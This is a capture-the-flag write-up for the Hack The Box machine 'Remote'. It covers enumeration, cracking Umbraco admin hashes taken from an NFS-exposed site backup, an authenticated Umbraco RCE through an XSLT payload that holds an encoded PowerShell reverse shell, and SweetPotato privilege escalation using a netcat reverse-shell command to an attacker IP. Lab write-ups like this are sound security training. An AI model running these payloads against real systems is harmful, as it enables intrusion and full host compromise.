---
title: HTB Remote
author: kei5uke
draft: false
description: Writeup for HTB Remote
tags:
  - windows
  - writeup
---
# Enumeration
```bash
nmap 10.129.230.172 -p- -sC -sV -T4 -oN nmap.tcp.txt -v

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
```
# Services
## ftp 21
![[Pasted image 20261012233103.png]]
Anonymous FTP login is allowed, but the account only has read access. no write permission.
## smb 445
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.134.88

PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

```bash
smbclient -L //10.129.230.172 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```
SMB enumeration doesn't reveal anything interesting.

## HTTP 80
![[Pasted image 20261012234030.png]]
The site runs Umbraco, but I couldn't find any version information from the front end. Feroxbuster didn't turn up anything useful either.

## rpc 111, 2049
```bash
rpcinfo -T udp -p 10.129.230.172                                            
   program vers proto   port  service
    100000    2   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    4   udp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    4   tcp    111  portmapper
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   tcp   2049  mountd
    100005    2   tcp   2049  mountd
    100005    3   tcp   2049  mountd
    100005    1   udp   2049  mountd
    100005    2   udp   2049  mountd
    100005    3   udp   2049  mountd
    100021    1   tcp   2049  nlockmgr
    100021    2   tcp   2049  nlockmgr
    100021    3   tcp   2049  nlockmgr
    100021    4   tcp   2049  nlockmgr
    100021    1   udp   2049  nlockmgr
    100021    2   udp   2049  nlockmgr
    100021    3   udp   2049  nlockmgr
    100021    4   udp   2049  nlockmgr
    100024    1   tcp   2049  status
    100024    1   udp   2049  status

showmount -e 10.129.230.172                                                                                                    ok | root@kali  16:37:14
Export list for 10.129.230.172:
/site_backups (everyone)

```

The NFS service exposes a `/site_backups` export that everyone can access, so I mounted it locally.
```bash
sudo mount -o nolock 10.129.230.172:/site_backups /tmp/10.129.230.172/share_name                                               ok | root@kali  16:40:24
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.

 ls -la                                                                                                ok | root@kali  16:42:40
total 119
drwx------ 2 nobody nogroup  4096 Feb 23  2020 .
drwxr-xr-x 3 root   root       60 Oct  7 16:40 ..
drwx------ 2 nobody nogroup    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Data
drwx------ 2 nobody nogroup  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody nogroup    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody nogroup 49152 Feb 20  2020 bin
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Config
drwx------ 2 nobody nogroup    64 Feb 20  2020 css
-rwx------ 1 nobody nogroup   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody nogroup    89 Nov  1  2018 Global.asax
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Media
drwx------ 2 nobody nogroup    64 Feb 20  2020 scripts
drwx------ 2 nobody nogroup  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody nogroup  4096 Feb 20  2020 Views
-rwx------ 1 nobody nogroup 28539 Feb 20  2020 Web.config

```

The backup includes `Web.config`, which confirms the Umbraco version:
```
<add key="umbracoConfigurationStatus" value="7.12.4" />
```

The backup also contains `Umbraco.sdf`, some binary file, which holds several user credential hashes:
```bash
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

```bash
hashcat -m 100 admin_hash /usr/share/wordlists/rockyou.txt.gz

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```


The admin hash cracks to the password `baconandcheese`, which lets me log in to the Umbraco admin panel.

Umbraco 7.12.4 is vulnerable to authenticated remote code execution, so I used this [exploit](https://www.exploit-db.com/exploits/46153) to get a shell, swapping in my own payload:
```python
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAxACIALAA0ADQAMwApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlADAAKQB7ACQAZAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwB0AHIAeQB7ACQAbwA9AGkAZQB4ACAAJABkACAAMgA+ACYAMQAgADMAPgAmADEAIAA0AD4AJgAxACAANQA+ACYAMQAgADYAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnAH0AYwBhAHQAYwBoAHsAJABvAD0AJABfAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGkAZgAoAFsAcwB0AHIAaQBuAGcAXQA6ADoASQBzAE4AdQBsAGwATwByAEUAbQBwAHQAeQAoACQAbwApACkAewAkAG8APQAiACIAfQAkAHAAPQAiAFAAUwAgACIAKwAoAHAAdwBkACkALgBQAGEAdABoACsAIgA+ACAAIgA7AFsAYgB5AHQAZQBbAF0AXQAkAHMAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABvACsAJABwACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA=="; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

```

# Shell
![[Screenshot 2026-10-13 at 11.56.19.png|308]]
That gives me an initial user shell.

The host is Windows Server 2019, and the user holds `SeImpersonatePrivilege` — a classic path to privilege escalation. I confirmed both:
```bash
systeminfo 
~~~
OS Name:                   Microsoft Windows Server 2019 Standard
~~~
```
```bash
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Abusing that privilege with SweetPotato gives me a `NT AUTHORITY\SYSTEM` shell:
```bash
 .\SweetPotato.exe -a "C:\windows\temp\nc.exe 10.10.14.41 4444 -e powershell"
``` 
![[Screenshot 2026-10-13 at 13.42.57.png|413]]